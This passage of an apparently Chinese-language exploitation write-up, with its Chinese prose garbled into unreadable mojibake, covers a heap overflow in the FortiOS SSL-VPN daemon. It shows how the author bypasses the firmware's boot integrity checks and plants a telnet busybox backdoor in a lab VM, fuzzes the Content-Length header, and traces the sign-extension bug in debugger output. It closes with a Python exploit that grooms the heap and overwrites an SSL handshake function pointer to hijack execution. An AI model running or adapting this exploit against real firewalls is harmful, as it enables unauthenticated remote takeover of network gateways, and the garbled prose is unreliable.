debugStub.port.guest32 = &amp;quot;12346&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ÂêØÂä®ÈÄªËæë&#34;&gt;ÂêØÂä®ÈÄªËæë:&lt;/h3&gt;
&lt;p&gt;‰ΩøÁî®vmlinux-to-elfÂ∞ÜÂÜÖÊ†∏flatkcËΩ¨‰∏∫elfÂàÜÊûê‰∏Ä‰∏ãÂêØÂä®ÈÄªËæë&lt;/p&gt;
&lt;p&gt;flatkc-&amp;gt;/sbin/init-&amp;gt;/bin/init&lt;/p&gt;
&lt;p&gt;flatkcÁöÑinit_post‰∏≠fgt_verifyÊúâÂØπÊñá‰ª∂ÂìàÂ∏åÁ≠âÁ≠âÁöÑÊ£ÄÊµã&lt;br&gt;
Â¶ÇÊûú‰∏çËÉΩÈÄöËøáfgt_verifyÊ£ÄÊµã‰ºöÂêØÂä®/sbin/init&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240807155305.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;ËÄå/sbin/init‰ºöËß£ÂéãÊñá‰ª∂Á≥ªÁªü‰∏≠ÁöÑtar.xzÂéãÁº©ÂåÖ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240807153418.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰∏∫‰∫ÜÈò≤Ê≠¢‰πãÂâçËß£ÂéãpatchÁöÑÊñá‰ª∂Ë¢´Ë¶ÜÁõñÔºåÊàë‰ª¨ÈúÄË¶ÅÁªïËøá/sbin/initÁöÑÊâßË°å&lt;br&gt;
Êúâ‰∏§ÁßçpatchÊñπÂºè&lt;br&gt;
Á¨¨‰∏ÄÁßç‰æøÊòØÂêØÂä®vmÁöÑdebugÂú®ÂêØÂä®Êó∂Êõ¥ÊîπÂØÑÂ≠òÂô®ÁöÑÂÄºËøõËÄå‰øÆÊîπÂêØÂä®ËøõÁ®ã&lt;br&gt;
Á¨¨‰∫åÁßçpatch ÂÜÖÊ†∏elfÂêéËΩ¨ÂõûÂÜÖÊ†∏Êñá‰ª∂ (ÊöÇÊú™È™åËØÅ:https://wzt.ac.cn/2024/04/02/fortigate_debug_env2/)&lt;/p&gt;
&lt;p&gt;/bin/init‰∏≠Â≠òÂú®Âá†‰∏™ÈíàÂØπÊñá‰ª∂Á≥ªÁªüÊòØÂê¶Ë¢´‰øÆÊîπÁöÑÊ£ÄÊü•&lt;br&gt;
ÈÄöËøáÂêØÂä®Êó∂ÊâìÂç∞ÁöÑ&lt;code&gt;System is starting&lt;/code&gt;ÂÆö‰ΩçÂáΩÊï∞&lt;br&gt;
Â¶ÇÊûúcheckÂ§±Ë¥•‰ºöÈáçÂêØÔºåËøôÈáåÊàë‰ª¨Â∞ÜÂÖ∂do_haltÂáΩÊï∞Á¨¨‰∏ÄÊù°ÊîπÊàêret&lt;br&gt;
![[Pasted image 20240812213039.png]]&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240812213049.png&#34; alt=&#34;Pasted image 20240812213049.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;debugstubË∞ÉËØï&#34;&gt;debugStubË∞ÉËØï&lt;/h2&gt;
&lt;p&gt;Êñ≠Âú®&lt;code&gt;fgt_verify&lt;/code&gt;ËøôÈáåÂ∞ÜËøîÂõûÂÄºÊîπ‰∏∫0Âç≥ÂèØËøõÂÖ•ifÂàÜÊîØÔºåÂêåÊó∂Â∞Ü&lt;code&gt;/sbin/init&lt;/code&gt; patch‰∏∫ &lt;code&gt;/bin/init&lt;/code&gt;Ôºå‰ªéËÄåÁõ¥Êé•ÊâßË°å&lt;code&gt;/bin/init&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809110446.png&#34; alt=&#34;Pasted image 20240809110446.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809105240.png&#34; alt=&#34;Pasted image 20240809105240.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;b *0xffffffff807ac117
c
ni
set $rax = 0
patch string 0xffffffff808f3591 &amp;quot;/bin/init&amp;quot;
patch byte 0xffffffff808f3591+9 0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809111721.png&#34; alt=&#34;Pasted image 20240809111721.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;patchÊàêÂäüÂêé‰æøËÉΩÊ≠£Â∏∏ÂêØÂä®&lt;/p&gt;
&lt;p&gt;Ê≠§Êó∂ËæìÂÖ•&lt;code&gt;diagnose hardware smartctl&lt;/code&gt;ÂºÄÂêØtelnetÂêéÈó® (ËÆ∞ÂæóÁºñËØëÂêéÈó®ÂíåbusyboxÁöÑÊó∂ÂÄôÁî®ÂØπglibcÁâàÊú¨ÔºåÂèØ‰ª•Âà∞Êñá‰ª∂Á≥ªÁªü‰∏ãÁöÑlib/libc.so.6ÊâæÔºåËøô‰∏™ÁâàÊú¨ÁöÑÊúÄÈ´òÊîØÊåÅÂà∞GLIBC_2.30&lt;br&gt;
Âê¶ÂàôÂ∞±‰ºöÂÉè‰∏ãÈù¢ËøôÊ†∑&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809112152.png&#34; alt=&#34;Pasted image 20240809112152.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;Âè¶Â§ñÊ≥®ÊÑèÁºñËØëbusyboxÁöÑÊó∂ÂÄôÂºÄÂêØstandalone shellÔºå‰∏çÁÑ∂‰ºöÊèêÁ§∫applet not found&lt;br&gt;
ÂêéÈó®&lt;code&gt;/bin/busybox ash --login -s&lt;/code&gt;Âç≥ÊòØÂºÄÂêØstandalone shell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240809154630.png&#34; alt=&#34;Pasted image 20240809154630.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ÊºèÊ¥ûÈ™åËØÅ&#34;&gt;ÊºèÊ¥ûÈ™åËØÅÔºö&lt;/h2&gt;
&lt;p&gt;Ê†πÊçÆÔºöFortiOS sslvpnd¬†‰∏≠Â≠òÂú®Âü∫‰∫éÂ†ÜÁöÑÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥ûÔºåÂèØÂà©Áî®ËØ•ÊºèÊ¥ûÂú®Êú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑÊÉÖÂÜµ‰∏ãÈÄöËøáÁâπÂà∂ËØ∑Ê±ÇËøúÁ®ãÊâßË°å‰ªªÊÑèÂëΩ‰ª§Êàñ‰ª£Á†Å&lt;br&gt;
Â∑≤Áü•Áî±Content-LengthÂºïËµ∑&lt;br&gt;
ËøôÈáåÁî®fuzzËÑöÊú¨ÊµãËØï:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl

path = &amp;quot;/remote/login&amp;quot;.encode()
content_length = [&amp;quot;0&amp;quot;, &amp;quot;-1&amp;quot;, &amp;quot;2147483647&amp;quot;, &amp;quot;2147483648&amp;quot;, &amp;quot;-0&amp;quot;,
                  &amp;quot;4294967295&amp;quot;, &amp;quot;4294967296&amp;quot;, &amp;quot;1111111111111&amp;quot;, &amp;quot;22222222222&amp;quot;]

# 2147483647 int max
# 2147483648 max+1 -&amp;gt; -2147483648
# 4294967295 unsigned int max
# 4294967296 max+1 -&amp;gt; 0
# 1111111111111
# 2222222222222

for CL in content_length:
    print(&amp;quot;[+] &amp;quot;+str(CL)+&amp;quot; :&amp;quot;)
    try:
        data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
            CL.encode() + b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;quot;
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _default_context = ssl._create_unverified_context()
        client = _default_context.wrap_socket(client)
        client.connect((&amp;quot;192.168.122.99&amp;quot;, 1443))
        client.sendall(data)
        res = client.recv(1024)
        if b&amp;quot;HTTP/1.1&amp;quot; not in res:
            print(&amp;quot;Error detected&amp;quot;)
            print(CL)
            break
    except Exception as e:
        print(e)
        print(&amp;quot;Error detected&amp;quot;)
        print(CL)
        break

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÂèëÁé∞Âú®CLËÆæÁΩÆ‰∏∫2147483647Êó∂Âá∫Áé∞ÈîôËØØ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814150311.png&#34; alt=&#34;Pasted image 20240814150311.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
gdbserverË∞ÉËØïÔºå‰ΩøÁî®telnetÁöÑ23Á´ØÂè£Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;killall telnetd &amp;amp;&amp;amp; /bin/gdbserver 192.168.122.99:23 --attach $(ps|grep sslvpn|grep -v grep|awk &#39;{print $1}&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814153201.png&#34; alt=&#34;Pasted image 20240814153201.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
backtrace:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;pwndbg&amp;gt; bt
#0  0x00007f8cfaa4476d in __memset_avx2_erms () from target:/usr/lib/x86_64-linux-gnu/libc.so.6
#1  0x000000000164e5d9 in ?? ()
#2  0x0000000001785ac2 in ?? ()
#3  0x000000000177f48d in ?? ()
#4  0x0000000001780b40 in ?? ()
#5  0x0000000001780c1e in ?? ()
#6  0x0000000001781131 in ?? ()
#7  0x00000000017823dc in ?? ()
#8  0x0000000001783762 in ?? ()
#9  0x0000000000448ddf in ?? ()
#10 0x0000000000451eba in ?? ()
#11 0x000000000044ea1c in ?? ()
#12 0x0000000000451128 in ?? ()
#13 0x0000000000451a51 in ?? ()
#14 0x00007f8cfa90ddeb in __libc_start_main () from target:/usr/lib/x86_64-linux-gnu/libc.so.6
#15 0x0000000000443c7a in ?? ()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ë∑üË∏™Âà∞ÊúÄÂêémemsetË∞ÉÁî®Â§Ñ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void *__fastcall pool_alloc(__int64 a1, size_t a2)
{
  _QWORD *v2; // rax
  char *v3; // r8
  unsigned __int64 v4; // rbx
  unsigned __int64 v7; // rdi
  __int64 v8; // rax

  v2 = *(_QWORD **)(a1 + 8);
  v3 = (char *)v2[2];
  if ( a2 )
  {
    v4 = 8LL * (int)(((a2 - 1) &amp;gt;&amp;gt; 3) + 1);
    if ( (unsigned __int64)&amp;amp;v3[v4] &amp;gt; *v2 )
    {
      v7 = dword_A8AC5A4 - 25;
      if ( v7 &amp;lt; v4 )
        v7 = 8LL * (int)(((a2 - 1) &amp;gt;&amp;gt; 3) + 1);
      v8 = sub_164E140(v7);
      *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = v8;
      *(_QWORD *)(a1 + 8) = v8;
      v3 = *(char **)(v8 + 16);
      *(_QWORD *)(v8 + 16) = &amp;amp;v3[v4];
    }
    else
    {
      v2[2] = &amp;amp;v3[v4];
    }
  }
  else
  {
    v3 = 0LL;
  }
  return memset(v3, 0, a2);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÖ∂‰∏≠ÊúÄÂêéreturnÁöÑmemsetÁöÑa2ÂèÇÊï∞Êù•Ê∫ê‰∫ésub_17859D0‰∏≠&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  v1 = (__int64 *)a1[92];
  v2 = sub_17901D0(a1[83]);
  v3 = v2;
  if ( !*(_QWORD *)(v2 + 8) )
    *(_QWORD *)(v2 + 8) = pool_alloc(*v1, *(_DWORD *)(v2 + 24) + 1);// Content-Length Âèñ4Â≠óËäÇ+1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Áé∞Âú®pocËß¶ÂèëÊó∂CL‰∏∫2147483647ÔºåÂç≥0x7fffffff&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov     eax, [rax+18h]
mov     rdi, [r12]
lea     esi, [rax+1]
movsxd  rsi, esi
call    pool_alloc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËøôÈáåmovsxd‰∏∫Â∏¶Á¨¶Âè∑Êâ©Â±ï‰º†ÈÄÅÊåá‰ª§&lt;br&gt;
Â∞Ü32‰ΩçÊâ©Â±ï‰∏∫64‰ΩçÔºåÂΩìÊâ©Â±ï‰∏Ä‰∏™Ë¥üÊï∞ÁöÑÊó∂ÂÄôÈúÄË¶ÅÂ∞ÜÊâ©Â±ïÁöÑÈ´ò‰ΩçÂÖ®Ëµã‰∏∫1.ÂØπ‰∫éÊ≠£Êï∞ËÄåË®ÄÔºåÁ¨¶Âè∑Êâ©Â±ïÂíåÈõ∂Êâ©Â±ïmovzxÊòØ‰∏ÄÊ†∑ÁöÑÔºåÂ∞ÜÊâ©Â±ïÁöÑÈ´ò‰ΩçÂÖ®Ëµã‰∏∫0ÔºåËÄå0x7fffffff+1ÂêéÊúÄÈ´ò‰ΩçÁ¨¶Âè∑‰Ωç‰∏∫1ÔºåÊâÄ‰ª•ÁªèËøáÊâ©Â±ïÂêérsiÂØÑÂ≠òÂô®ÂÄº‰∏∫0xffffffff80000000Ôºå‰º†ÈÄíÁªômemsetËΩ¨Êç¢‰∏∫size_tÊó†Á¨¶Âè∑Êï¥Êï∞‰ºöÂØºËá¥ÂÜÖÂ≠òÊ∫¢Âá∫ÔºåÂ¥©Ê∫É&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ‚ñ∫ 0x164e5d4    call   memset@plt                      &amp;lt;memset@plt&amp;gt;
        s: 0x7f8cf4a556c8 ‚óÇ‚Äî 0x0
        c: 0x0
        n: 0xffffffff80000000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËÄåÊàë‰ª¨ÈúÄË¶ÅÂà©Áî®Ëøô‰∏ÄÁÇπÔºå‰ΩøÂæópool_allocÁöÑÂ†ÜÂùóÂ§ßÂ∞èÂ∞è‰∫é‰∏ãÊñπmemcpyÊó∂‰ΩçÊâ©Â±ïÂêéÁöÑÂ§ßÂ∞èÔºå‰ªéËÄåÂØºËá¥Â†ÜÊ∫¢Âá∫&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;v1 = (__int64 *)a1[92];
  v2 = sub_17901D0(a1[83]);
  v3 = v2;
  if ( !*(_QWORD *)(v2 + 8) )
    *(_QWORD *)(v2 + 8) = pool_alloc(*v1, *(_DWORD *)(v2 + 24) + 1);// Content-Length Âèñ4Â≠óËäÇ+1 Ôºå ÂàÜÈÖçÂ∞èÂ†ÜÂùó
  v4 = sub_1662AC0(v1, v3 + 32, 8190LL);
  v5 = v4;
  if ( v4 )
  {
    if ( v4 &amp;lt; 0 )
    {
      if ( (unsigned int)sub_16593E0(a1[77]) - 1 &amp;lt;= 4 )
        return 0LL;
    }
    else
    {
      v6 = *(int *)(v3 + 16);
      v7 = *(_QWORD *)(v3 + 24);
      if ( (int)v6 + v4 &amp;gt; v7 )
        v5 = *(_QWORD *)(v3 + 24) - v6;
      if ( v7 &amp;gt; v6 )
      {
        memcpy((void *)(*(_QWORD *)(v3 + 8) + v6), (const void *)(v3 + 32), v5); // Â†ÜÊ∫¢Âá∫
        v10 = *(_QWORD *)(v3 + 24);
        v11 = *(_DWORD *)(v3 + 16) + v5;
        *(_DWORD *)(v3 + 16) = v11;
        if ( v11 &amp;lt; v10 )
          return 0LL;
      }
      else
      {
        v8 = *(_DWORD *)(v3 + 16) + v5;
        *(_DWORD *)(v3 + 16) = v8;
        if ( v8 &amp;lt; v7 )
          return 0LL;
      }
    }
  }
  return 2LL;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êàë‰ª¨ÊûÑÈÄ†CL‰∏∫0x100000000ÔºåÊñ≠Âú®0x1785ABDÂ§ÑÔºåÂèØ‰ª•ÁúãÂá∫Âú®ÁªèËøá‰ΩçÊâ©Â±ïÂêé‰º†ÂÖ•ÂèÇÊï∞‰∏∫1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt; ‚Üí  0x1785abd                  call   0x164e590
   ‚Ü≥   0x164e590                  push   rbp
       0x164e591                  mov    rbp, rsp
       0x164e594                  push   r13
       0x164e596                  push   r12
       0x164e598                  mov    r12, rsi
       0x164e59b                  push   rbx
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ arguments (guessed) ‚îÄ‚îÄ‚îÄ‚îÄ0x164e590 (
   $rdi = 0x00007f146c2fa018 ‚Üí 0x00007f146c2fa000 ‚Üí 0x00007f146c2fa400 ‚Üí 0x00007f146c2fa800 ‚Üí 0x0000000000000006,
   $rsi = 0x0000000000000001
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁÑ∂ÂêéÂà∞memcpyÂ§Ñ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;memcpy@plt (
   $rdi = 0x00007f146c2fa818 ‚Üí 0x0000000000000000,
   $rsi = 0x00007f146c342038 ‚Üí &amp;quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&amp;quot;,
   $rdx = 0x0000000000001000,
   $rcx = 0x0000000000000000
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê≠§Â§ÑÂèØ‰ª•ÂèëÈÄÅË∂ÖÈïødataÔºåËÉΩÂ§üÂ†ÜÊ∫¢Âá∫&lt;/p&gt;
&lt;h2 id=&#34;ÊºèÊ¥ûÂà©Áî®&#34;&gt;ÊºèÊ¥ûÂà©Áî®Ôºö&lt;/h2&gt;
&lt;p&gt;Áé∞Âú®ËÉΩÂ§üËøõË°åÂ†ÜÊ∫¢Âá∫Ôºå‰ΩÜÊòØÂ¶Ç‰ΩïÂä´ÊåÅÊâßË°åÊµÅÂë¢ÔºåËøôÈáåÂèÇËÄÉ‰∏ãÈù¢ÊñáÁ´†:&lt;br&gt;
https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&lt;br&gt;
Áî±‰∫éfortiosËôöÊãüÊú∫‰∏≠Âè™Êúâ‰∏Ä‰∏™webÂÆàÊä§ËøõÁ®ãÔºå‰ΩøÁî®epoll()Â§ÑÁêÜËøûÊé•ÔºåÊâÄ‰ª•ÊâÄÊúâËøûÊé•ÁöÑÊâÄÊúâÂÜÖÂ≠òÊìç‰ΩúÈÉΩ‰ºöÂú®Âêå‰∏ÄÂùóÂ†Ü‰∏äËøõË°å&lt;br&gt;
ËÄåÂΩìÊàë‰ª¨ÂèëÈÄÅHTTPËØ∑Ê±ÇÊó∂Ôºå‰ºöÂú®Â†Ü‰∏äÂàÜÈÖçSSLÁªìÊûÑ‰Ωì&lt;br&gt;
ËÄåÂ¶ÇÊûúÂä´ÊåÅSSLÁªìÊûÑ‰Ωì‰∏≠&lt;code&gt;*handshake_func&lt;/code&gt;ÁöÑÂáΩÊï∞ÊåáÈíàÔºåÂ∞±ËÉΩÂä´ÊåÅÊâßË°åÊµÅ&lt;br&gt;
ÊâÄ‰ª•Áé∞Âú®ÁöÑÊÄùË∑ØÊòØÔºöÈÄöËøáÂèëÈÄÅÂ§ö‰∏™Ê≠£Â∏∏ÁöÑHTTPËØ∑Ê±ÇÂú®Â†Ü‰∏äÂñ∑Â∞ÑSSLÁªìÊûÑ‰ΩìÔºåÂÜçÈÄöËøáÂ†ÜÊ∫¢Âá∫Ë¶ÜÁõñËøô‰∫õÁªìÊûÑ‰ΩìÁöÑÂáΩÊï∞ÊåáÈíàËææÂà∞Âä´ÊåÅÊâßË°åÊµÅÁöÑÊïàÊûú&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240815173039.png&#34; alt=&#34;Pasted image 20240815173039.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;Áõ∏ÂÖ≥Ê±áÁºñ@sub_1780A20:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;.text:0000000001780B00 48 8B 82 C0 00 00 00          mov     rax, [rdx+0C0h]
.text:0000000001780B07 4C 89 EF                      mov     rdi, r13
.text:0000000001780B0A 48 85 C0                      test    rax, rax
.text:0000000001780B0D 0F 84 85 00 00 00             jz      loc_1780B98
.text:0000000001780B0D
.text:0000000001780B13 5B                            pop     rbx
.text:0000000001780B14 41 5C                         pop     r12
.text:0000000001780B16 41 5D                         pop     r13
.text:0000000001780B18 41 5E                         pop     r14
.text:0000000001780B1A 5D                            pop     rbp
.text:0000000001780B1B FF E0                         jmp     rax
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞Ü‰πãÂâçÁöÑfuzzËÑöÊú¨ÊåâÁÖß‰ª•‰∏ãÊÄùË∑ØÊîπÈÄ†:&lt;br&gt;
ÔºàÊüê‰∫õÊ≠•È™§‰∏ç‰∏ÄÂÆöÈúÄË¶ÅÊàñËÄÖÊúâÁî®ÔºâÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. ÂàõÂª∫ 60 ‰∏™ sock ËøûÊé•ÔºåÂπ∂ÂèëÈÄÅ‰∏çÂÆåÊï¥ÁöÑ http ËØ∑Ê±ÇÔºåÂ∏åÊúõËÉΩÂú®ÊúçÂä°Á´ØÂàÜÈÖçÂ§ö‰∏™ SSL ÁªìÊûÑ‰Ωì
2. ‰ªéÁ¨¨ 40 ‰∏™ÂºÄÂßãÈó¥ÈöîÈáäÊîæ 10 ‰∏™ sock ÈìæÊé•ÔºåÂ∏åÊúõÂú®ÊúçÂä°Á´ØÈáäÊîæÂá†‰∏™ SSL ÁªìÊûÑ‰ΩìÁöÑ Hole.
3. ÂàÜÈÖçÁî®‰∫éÊ∫¢Âá∫ÁöÑ exp_sk
4. ÂÜçÂàÜÈÖç 20 ‰∏™ sock ËøûÊé•ÔºåÂ§öÂàÜÈÖçÂá†‰∏™ SSL ÁªìÊûÑ‰Ωì
5. Ëß¶ÂèëÊ∫¢Âá∫ÔºåÂ∏åÊúõ‰øÆÊîπ SSL ÁªìÊûÑ‰Ωì‰∏≠ÁöÑÂáΩÊï∞ÊåáÈíà
6. ÁªôÂÖ∂‰ªñ socket ÂèëÈÄÅÊï∞ÊçÆÔºåÁ≠âÂæÖÂáΩÊï∞ÊåáÈíàË∞ÉÁî®
7. Âä´ÊåÅÂáΩÊï∞ÊåáÈíàÂêéÔºåÂàáÊç¢Ê†àÂà∞ÂèØÊéßÊï∞ÊçÆÂå∫ÔºåÁÑ∂Âêé ROP ËÆ°ÁÆóÊ†àÂú∞ÂùÄÔºåË∞ÉÁî® mprotect ËÆ©Ê†àÂå∫ÊúâÂèØÊâßË°åÊùÉÈôê
8. jmp esp Ë∑≥ËΩ¨Âà∞Ê†à‰∏äÁöÑ shellcode ÊâßË°å„ÄÇ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ª•‰∏äÊòØÊåâÁÖßret2mprotectÁöÑÊâìÊ≥ïÊù•ÁöÑÔºåËøôÈáåÊàë‰ª¨pocÁõ¥Êé•ÊâìropÔºåÂà©Áî®Êàë‰ª¨‰∏ä‰º†ÁöÑbusyboxÊºîÁ§∫Âç≥ÂèØ&lt;br&gt;
Ê≥®ÊÑèÂâçÈù¢ÂàõÂª∫ÁöÑsocksËøûÊé•ÁõÆÁöÑÊòØ‰∏∫‰∫ÜËÆ©Â†ÜÂπ≥È°∫‰∏ÄÁÇπÔºåÁúüÊ≠£Ê∫¢Âá∫ÁöÑÊòØpayloadÊâÄÂú®socks‰πãÂêéÁöÑËøûÊé•&lt;br&gt;
ËøôÈáå‰ª•ÂâçÂàõÂª∫ÁöÑsocksËøûÊé•ÈáåÈù¢CLÁöÑÂ§ßÂ∞è‰ºöÂΩ±ÂìçÂ†Ü‰∏äÂàÜÈÖçÁöÑÁªìÊûÑ‰ΩìÔºåÊàë‰ª¨ÈÄâÊã©2000ÔºåËß¶ÂèëÊ¶ÇÁéáÂ§ß‰∏ÄÁÇπ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl
from pwn import *

ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443


path = &amp;quot;/remote/login&amp;quot;.encode()
# content_length = [&amp;quot;0&amp;quot;, &amp;quot;-1&amp;quot;, &amp;quot;2147483647&amp;quot;, &amp;quot;2147483648&amp;quot;, &amp;quot;-0&amp;quot;,
#                   &amp;quot;4294967295&amp;quot;, &amp;quot;4294967296&amp;quot;, &amp;quot;1111111111111&amp;quot;, &amp;quot;22222222222&amp;quot;]

content_length = &amp;quot;115964116992&amp;quot;

# 2147483647 int max
# 2147483648 max+1 -&amp;gt; -2147483648
# 4294967295 unsigned int max
# 4294967296 max+1 -&amp;gt; 0
# 1111111111111
# 2222222222222

# 0x000000000043a016 : ret
ret = 0x000000000043a016
counter = 0


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


socks = []

for i in range(60):
    sk = create_ssl_ctx()
    data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: 2000\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;quot;
    sk.sendall(data)
    socks.append(sk)


# payload = B&amp;quot;A&amp;quot;*2592+p64(0xdeadbeef)
# payload = payload.ljust(0x2000, b&amp;quot;A&amp;quot;)
payload = cyclic(0x4000)
print(&amp;quot;[+] &amp;quot;+str(content_length)+&amp;quot; :&amp;quot;)
data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
    content_length.encode() + \
    b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&amp;quot;+payload
client = create_ssl_ctx()


for i in range(20, 40, 2):
    sk = socks[i]
    sk.close()
    socks[i] = None


client.sendall(data)


for sk in socks:
    if sk:
        data = b&amp;quot;b&amp;quot; * 40
        sk.sendall(data)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰∏∫‰∫ÜÊñπ‰æøË∞ÉËØïÔºåÊàë‰ª¨ÊûÑÈÄ†payload‰∏∫cyclic(0x4000)ÔºåÊúâÊ¶ÇÁéáÊñ≠Âú®&lt;code&gt;0x1780B1B&lt;/code&gt;Â§ÑÊâßË°å&lt;code&gt;jmp rax&lt;/code&gt;ÔºåÊ≠§Êó∂ÂÅèÁßª‰∏∫3616&lt;br&gt;
ÂèØ‰ª•Âä´ÊåÅÊâßË°åÊµÅ&lt;br&gt;
